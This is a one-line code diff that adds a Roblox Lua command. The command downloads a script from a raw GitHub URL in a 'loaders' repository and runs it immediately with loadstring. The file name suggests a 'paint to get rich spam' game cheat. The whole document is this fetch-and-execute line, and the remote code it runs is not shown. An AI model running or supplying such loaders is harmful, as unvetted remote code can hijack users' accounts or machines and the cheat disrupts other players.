@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/upd-paint-to-get-rich-spam7-3forifbsgzjxso.lua"))()
